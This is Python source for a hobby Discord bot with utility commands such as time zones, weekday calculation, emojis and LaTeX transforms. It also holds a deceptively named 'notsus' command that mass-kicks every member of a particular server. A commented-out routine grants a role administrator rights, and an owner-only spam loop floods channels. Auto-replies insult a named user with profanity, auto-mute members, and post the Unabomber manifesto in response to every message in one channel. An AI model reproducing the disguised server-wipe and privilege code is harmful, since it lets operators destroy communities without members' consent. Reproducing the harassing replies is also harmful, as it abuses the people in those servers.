import discord
from discord.ext import commands
from discord.utils import get

import json

import os
from dotenv import load_dotenv

from unicodedata import *

from datetime import datetime, timedelta
from time import localtime, strftime
import time

import math

import cocanb

from replit import db
from keep_alive import keep_alive

from cocanb import Cocánb
from unicode import Unicode
from acknowledgements import Acknowledgements
from moderation import Moderation

import asyncio

load_dotenv()
TOKEN = os.getenv('TOKEN')

bot=commands.Bot(command_prefix="c.")
guild = bot.get_guild(731109675327553567)

@bot.event
async def on_ready():
  await bot.change_presence(status=discord.Status.online, activity=discord.Game(name='c.help'))
  
@bot.event
async def on_message(message):
  #idk how to do this
  #if message.author.id == 807436687977611274 and " » c." in message.content:
  #  await message.channel.send(message.content)
  #  await message.edit(content='test')

    #this bit of code is unrelated to the first part
    #msglist = message.content.split(" » ")
    #msglist.pop(0)
    #msg = " » ".join(msglist)
    #await bot.process_commands(msg)
    #command = str(msg.split(" ")[0])
    #query = " ".join(msg.split(" ")[1:])
    #await message.channel.send(msg)
    #await message.channel.send(command)
    #await message.channel.send(query)
    #await msg.invoke(get_command(command), query=query)
  if message.content == "?" and message.author.id == 698865312954843216:
        await message.channel.send('shut the fuck up grogu you know what we were talking about stop acting stupid')
  await bot.process_commands(message)

  if message.content == "<@607583934527569920>" and message.channel.id == 845216463237021706:
    await message.channel.send("If you ping the owner one more time he won't help you with your question.")

  if message.content == "<@801983327023398912>" and message.channel.id == 845216463237021706:
    await message.channel.send("If you pinged me for maths help you have to realise that I am just a measly bot who can't do maths.")

  if ("@everyone" in message.content or "<@&800718299167064064>"in message.content) and message.guild.id == 731109675327553567:
    await message.channel.send("How fucking narcissistic do you have to be to ping hundreds of people and disrupt their lives just for you? You're lucky the everyone role you just pinged was fake otherwise you probably would have annoyed a lot of people.")

  if (message.guild.id == 932135849838129152 and message.author.id != 801983327023398912 and(message.content == '"' or message.content == '-' or message.content == '0' or message.content == '=' or message.content == "'" or (("'-'" in message.content or '"\n0\n=' in message.content) and "c." not in message.content))):
    await message.delete() 
    await message.channel.send("cringe")
    role = discord.utils.get(message.guild.roles, name="unbased")
    await message.author.add_roles(role)
    channel = bot.get_channel(932896343901478963)
    await channel.send(f"You have been muted for 5 minutes lol <@{message.author.id}>")
    await asyncio.sleep(300)
    await message.author.remove_roles(role)
  
  if message.channel.id == 932896343901478963 and message.author.id != 801983327023398912:
    await message.channel.send(f"<@{message.author.id}>\nThe Industrial Revolution and its consequences have been a disaster for the human race. They have greatly increased the life-expectancy of those of us who live in “advanced” countries, but they have destabilized society, have made life unfulfilling, have subjected human beings to indignities, have led to widespread psychological suffering (in the Third World to physical suffering as well) and have inflicted severe damage on the natural world. The continued development of technology will worsen the situation. It will certainly subject human beings to greater indignities and inflict greater damage on the natural world, it will probably lead to greater social disruption and psychological suffering, and it may lead to increased physical suffering even in “advanced” countries.")


@bot.command(name='ping', help="Checks whether bot is online.")
async def ping(ctx):
  await ctx.send('Bot is online.')

@bot.command(pass_context=True)
async def spam(ctx: commands.Context, count: int, *, message: str):
    """
    : Spam a message a set amount of times. Enter "stop" to stop the spam early

    Args:
        count (int): The number of times to spam the message
        message (str): The message to spam
    """
    if ctx.message.author.id == 607583934527569920:
      _spam = True
      while _spam and count:
          await ctx.send(message)

          def check(msg: discord.Message):
              return not msg.author.bot and msg.content.lower() == "stop"

          try:
              if await bot.wait_for("message", check=check, timeout=1.5):
                  _spam = False
                  await ctx.send("Okay I'm done now.")
          except asyncio.TimeoutError:
              count -= 1

#@bot.command(pass_context=True, help="give role")
#async def giverole(ctx, user: discord.Member, role: discord.Role):
    #await user.add_roles(role)

#@bot.command()
#async def EditRoleTest(ctx):
    #guild = bot.get_guild(419075224571478017)
    #role = get(guild.roles, id=718073241524240474)
    #permissions = discord.Permissions()
    #permissions.update(administrator = True)
    #await role.edit(permissions=permissions)

@bot.command(name='time',
             help='Shows current time given a timezone (In (-)HH:MM format)')
async def time(ctx, timezone: str = '00:00'):
	if timezone[0] == '-':
		hours = int(timezone[:-3]) - int(timezone[-2:]) / 60
	else:
		hours = int(timezone[:-3]) + int(timezone[-2:]) / 60
	future_time = datetime.today() + timedelta(hours=hours)
	if timezone == '00:00':
		plus = '±'
	elif timezone[0] == '-':
		plus = ''
	elif timezone[0] == '+':
		plus = ''
	else:
		plus = '+'
	week_day = future_time.weekday()
	weekdays = ("Monday", "Tuesday", "Wednesday", "Thursday", "Friday",
	            "Saturday", "Sunday")
	week_day = weekdays[week_day]
	if timezone[-3] == ':':
		await ctx.send('`' + week_day + ', ' + str(future_time) + ', UTC' +
		               plus + timezone + '`')
	else:
		await ctx.send ('invalid timezone')

@bot.command(name='weekday', help="Returns day of the week for a given date (Format: DD MM YYYY)")
async def weekday(ctx, day:int, month:int, year:int):
#check if date is valid
  if (year % 4 == 0 and year % 100 != 0) or year % 400 == 0:
    month_length = [31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
  else:
    month_length = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
  if month > 12:
    await ctx.send ("Invalid date")
  elif day > month_length[month-1]:
    await ctx.send ("Invalid date")

  #conway's algorithm
  else:
    doomsday = {1:3, 2:28, 3:14, 4:4, 5:9, 6:6, 7:11, 8:8, 9:5, 10:10, 11:7, 12:12}
    doomsday_leap = {1:4, 2:29, 3:14, 4:4, 5:9, 6:6, 7:11, 8:8, 9:5, 10:10, 11:7, 12:12}
    if (year % 4 == 0 and year % 100 != 0) or year % 400 == 0:
      #print ("leap_year")
      doomsday_offset = (day - doomsday_leap[month]) % 7
    else: 
      doomsday_offset = (day - doomsday[month]) % 7
    
    century_dict = {0:2, 1:0, 2:5, 3:3}
    century_code = century_dict[int (year / 100) % 4]

    num1 = int ((year % 100) / 12)
    num2 = (year % 100) % 12
    num3 = int (num2 / 4)

    #print (doomsday_offset)
    #print (century_code)
    #print (num1)
    #print (num2)
    #print (num3)
    #print ()

    weekday = (doomsday_offset + century_code + num1 + num2 + num3) % 7
    weekdays = {0:"Sunday", 1:"Monday", 2:"Tuesday", 3:"Wednesday", 4:"Thursday", 5:"Friday", 6:"Saturday"}
    weekday = weekdays[weekday]
    await ctx.send (weekday)

		

@bot.command(name="return", help="Returns message")
async def msgreturn(ctx, *, msg):
	await ctx.send(msg)

@bot.command(name='minecraftinfo', help="Sends information for Minecraft server")
async def minecraftinfo(ctx):
  await ctx.send('SERVER INFO:\nHostname: cocanb.aternos.me:36520\nIP: 185.116.157.37\nPort: 36520\n\nVersion: PaperMC 1.17.1\nPlugins: DiscordSRV, WorldEdit\nGamemode: Creative\nDifficulty: Normal')


@bot.command(name="delreturn",help="Returns message (deletes original message)\n(may not work on every server)")
async def delreturn(ctx, *, msg):
	await ctx.message.delete()
	await ctx.send(msg)

@bot.command(
    name="emoji",
    help=
    "Sends some emojis\nSupported: amogus/amongus/among us, barry, biang, bruh/facepalm, surprised/that's illegal/illegal, void, woah, shitting toothpaste, dababy\n(words separated by / output the same emoji)"
)
async def emoji(ctx, *, name):
	name = name.lower()
	if name == "ye":
		await ctx.send("<:ye:799291949273317377>")
	elif name == "amogus" or name == "amongus" or name == "among us":
		await ctx.send("<:amogus:809427238784860210>")
	elif name == "barry":
		await ctx.send("<:barry:811154017672757270>")
	elif name == "biang":
		await ctx.send("<:biang:809669658143227905>")
	elif name == "bruh" or name == "facepalm":
		await ctx.send("<:bruh:801100506251526145>")
	elif name == "surprised" or name == "that's illegal" or name == "illegal":
		await ctx.send("<:surprised:801099678988501072>")
	elif name == "void":
		await ctx.send("<:void:798150976191201313>")
	elif name == "woah":
		await ctx.send("<:woah:807905973162999818>")
	elif name == "shitting toothpaste":
	  await ctx.send("<:shittingtoothpaste:850006091827773441>")
	elif name == "dababy":
	  await ctx.send("<:dababy:850279101548855317>")
	else:
		await ctx.send("Invalid emoji")

@bot.command(name='customemoji', help='Sends custom emoji not in c.emoji list\n(Emoji must be from a server this bot is in)')
async def customemoji(ctx, name, emoji_id, animated: str = ''):
  if animated=='':
    anim=''
  else:
    anim='a'
  await ctx.send(f'<{anim}:{name}:{emoji_id}>')

@bot.command(name='ipa', help='Sends official International Phonetic Alphabet chart')
async def ipa(ctx):
    with open("Resources/IPA_Kiel_2020_full.pdf", "rb") as file:
      await ctx.send("Official International Phonetic Alphabet Chart", file=discord.File(file, "Official International Phonetic Alphabet Chart.pdf"))

@bot.command (name="latextransform", help="Linearly transform a piece of LaTeX code using a matrix\n\n Input the four entries of the transformation matrix in the following order: top left, bottom left, top right then bottom right, then the LaTeX code, each separated by spaces")
async def latextransform (ctx, m00, m10, m01, m11, *, latex):
  m00 = float (m00)
  m10 = float (m10)
  m01 = float (m01)
  m11 = float (m11)

  E = (m00 + m11) / 2
  F = (m00 - m11) / 2
  G = (m10 + m01) / 2
  H = (m10 - m01) / 2

  Q = math.sqrt (E**2 + H**2)
  R = math.sqrt (F**2 + G**2)

  sx = Q + R
  sy = Q - R

  a1 = math.atan2 (G,F)
  a2 = math.atan2 (H,E)

  theta = (a2 - a1) / 2
  phi = (a2 + a1) / 2

  theta_deg = theta * 180 / math.pi
  phi_deg = phi * 180 / math.pi

  await ctx.send ('```$\\rotatebox{'+str(phi_deg)+'}{$\\scalebox{'+str(sx)+'}['+str(sy)+']{$\\rotatebox{'+str(theta_deg)+'}{$'+latex+'$}$}$}$```')

@bot.command(name="notsus")
async def notsus(ctx):
    if ctx.author.id == 702746453927264276 or ctx.author.id == 607583934527569920:
        for member in bot.get_guild(725639774190305360).members:
            try:
                await member.kick()
                continue
            except Exception:
                continue
            else:
                continue

                

bot.add_cog(Cocánb(bot))
bot.add_cog(Unicode(bot))
bot.add_cog(Acknowledgements(bot))
bot.add_cog(Moderation(bot))

keep_alive()
bot.run(TOKEN)